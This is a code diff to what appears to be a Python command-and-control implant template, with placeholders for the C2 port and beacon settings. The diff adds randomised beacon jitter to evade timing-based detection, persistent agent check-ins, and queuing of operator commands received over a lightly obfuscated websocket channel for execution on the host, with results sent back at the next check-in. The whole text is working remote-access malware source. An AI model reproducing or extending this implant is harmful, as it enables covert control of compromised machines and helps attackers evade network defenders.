@@ -15,6 +15,7 @@ SERVER_PORT = {{C2_PORT}}
 RECONNECT_DELAY = 5
 BEACON_MODE = {{BEACON_MODE}}
 BEACON_INTERVAL = {{BEACON_INTERVAL}}
+BEACON_JITTER = {{BEACON_JITTER}}  # Percentage (0-100)
 
 
 def simple_encrypt(data: str) -> str:
@@ -31,6 +32,21 @@ def simple_decrypt(data: str) -> str:
     decoded = base64.b64decode(data.encode())
     decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
     return decrypted.decode()
+
+
+def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
+    """Calculate sleep time with jitter applied"""
+    if jitter_percent <= 0 or jitter_percent > 100:
+        return float(base_interval)
+
+    import random
+    # Calculate jitter range: interval ± (interval * jitter / 100)
+    jitter_amount = base_interval * (jitter_percent / 100.0)
+    min_sleep = base_interval - jitter_amount
+    max_sleep = base_interval + jitter_amount
+
+    # Return random value within range
+    return random.uniform(max(0, min_sleep), max_sleep)
 
 
 def get_metadata():
@@ -116,6 +132,10 @@ async def connect_to_server():
     socks_writer = None
     current_mode = 'beacon' if BEACON_MODE else 'streaming'
     beacon_interval = BEACON_INTERVAL
+    beacon_jitter = BEACON_JITTER
+    agent_id = None  # Persist agent_id across beacon cycles
+    pending_results = []  # Store command results for next checkin
+    pending_commands = []  # Store commands to execute offline
 
     while True:
         try:
@@ -123,64 +143,108 @@ async def connect_to_server():
                 metadata = get_metadata()
                 metadata['mode'] = current_mode
                 metadata['beacon_interval'] = beacon_interval
+                metadata['beacon_jitter'] = beacon_jitter
 
-                register_msg = {
-                    'type': 'register',
-                    'metadata': metadata
-                }
-                encrypted = simple_encrypt(json.dumps(register_msg))
+                # Use checkin if we already have an agent_id, otherwise register
+                if agent_id:
+                    checkin_msg = {
+                        'type': 'checkin',
+                        'agent_id': agent_id,
+                        'metadata': metadata
+                    }
+                    encrypted = simple_encrypt(json.dumps(checkin_msg))
+                else:
+                    register_msg = {
+                        'type': 'register',
+                        'metadata': metadata
+                    }
+                    encrypted = simple_encrypt(json.dumps(register_msg))
+
                 await websocket.send(encrypted)
 
                 response = await websocket.recv()
                 decrypted = simple_decrypt(response)
                 reg_data = json.loads(decrypted)
 
-                if reg_data.get('type') == 'registered':
-                    agent_id = reg_data.get('agent_id')
+                if reg_data.get('type') in ['registered', 'checkin_ack']:
+                    if not agent_id:
+                        agent_id = reg_data.get('agent_id')
                     heartbeat_task = None
 
                     if current_mode == 'streaming':
                         heartbeat_task = asyncio.create_task(heartbeat(websocket))
 
-                    # Beacon mode: check for commands then disconnect
+                    # Beacon mode: send results AFTER getting ack, then fetch commands
                     if current_mode == 'beacon':
-                        try:
-                            # Wait briefly for any queued commands
-                            message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
-                            decrypted = simple_decrypt(message)
-                            data = json.loads(decrypted)
+                        # Wait a moment for command to be queued
+                        await asyncio.sleep(0.1)
 
-                            if data.get('type') == 'command':
-                                command = data.get('command', '')
-                                output = execute_command(command)
+                        # Step 1: Send any pending results from previous cycle
+                        if pending_results:
+                            for result in pending_results:
+                                try:
+                                    encrypted_response = simple_encrypt(json.dumps(result))
+                                    await websocket.send(encrypted_response)
+                                except Exception:
+                                    pass
+                            pending_results.clear()
 
-                                response = {
-                                    'type': 'response',
-                                    'output': output
-                                }
-                                encrypted_response = simple_encrypt(json.dumps(response))
-                                await websocket.send(encrypted_response)
+                        # Step 2: Fetch all queued commands (non-blocking)
+                        pending_commands.clear()
+                        while True:
+                            try:
+                                message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
+                                decrypted = simple_decrypt(message)
+                                data = json.loads(decrypted)
 
-                            elif data.get('type') == 'set_interval':
-                                beacon_interval = data.get('interval', beacon_interval)
+                                if data.get('type') == 'command':
+                                    # Store command for offline execution
+                                    pending_commands.append({
+                                        'command': data.get('command', ''),
+                                        'timestamp': data.get('timestamp', '')
+                                    })
 
-                            elif data.get('type') == 'upgrade_mode':
-                                current_mode = 'streaming'
-                                mode_msg = {
-                                    'type': 'mode_change',
-                                    'mode': 'streaming'
-                                }
-                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
-                                await websocket.send(encrypted_msg)
-                                # Don't break, switch to streaming mode handling
+                                elif data.get('type') == 'set_interval':
+                                    beacon_interval = data.get('interval', beacon_interval)
 
-                        except asyncio.TimeoutError:
-                            # No commands, disconnect and sleep
-                            pass
+                                elif data.get('type') == 'upgrade_mode':
+                                    current_mode = 'streaming'
+                                    mode_msg = {
+                                        'type': 'mode_change',
+                                        'mode': 'streaming'
+                                    }
+                                    encrypted_msg = simple_encrypt(json.dumps(mode_msg))
+                                    await websocket.send(encrypted_msg)
+                                    break
 
-                        # Disconnect and sleep for beacon interval
+                            except asyncio.TimeoutError:
+                                # No more commands, proceed to disconnect
+                                break
+
+                        # Step 3: Disconnect and execute commands "offline"
                         if current_mode == 'beacon':
-                            await asyncio.sleep(beacon_interval)
+                            # Execute all commands during sleep period
+                            for cmd_data in pending_commands:
+                                try:
+                                    output = execute_command(cmd_data['command'])
+                                    # Store result for next checkin
+                                    pending_results.append({
+                                        'type': 'response',
+                                        'output': output,
+                                        'command': cmd_data['command'],
+                                        'timestamp': cmd_data['timestamp']
+                                    })
+                                except Exception as e:
+                                    pending_results.append({
+                                        'type': 'response',
+                                        'output': f"Error executing command: {str(e)}",
+                                        'command': cmd_data['command'],
+                                        'timestamp': cmd_data['timestamp']
+                                    })
+
+                            # Sleep for beacon interval (with jitter)
+                            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
+                            await asyncio.sleep(sleep_time)
                             continue
 
                     # Streaming mode: maintain persistent connection
